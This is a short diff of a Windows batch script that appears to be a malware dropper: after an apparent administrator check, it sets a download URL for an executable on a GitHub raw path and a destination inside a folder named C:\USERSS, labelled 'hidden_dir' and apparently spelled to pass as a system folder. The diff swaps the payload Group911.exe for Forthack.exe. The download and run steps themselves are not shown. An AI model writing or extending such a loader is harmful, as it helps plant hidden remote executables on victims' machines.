@@ -7,8 +7,8 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-set "download_url=https://raw.githubusercontent.com/uj9e/g/refs/heads/main/Group911.exe"
-set "destination=C:\USERSS\Group911.exe"
+set "download_url=https://github.com/uj9e/g/raw/refs/heads/main/Forthack.exe"
+set "destination=C:\USERSS\Forthack.exe"
 set "hidden_dir=C:\USERSS"
 
 if not exist "%hidden_dir%" (
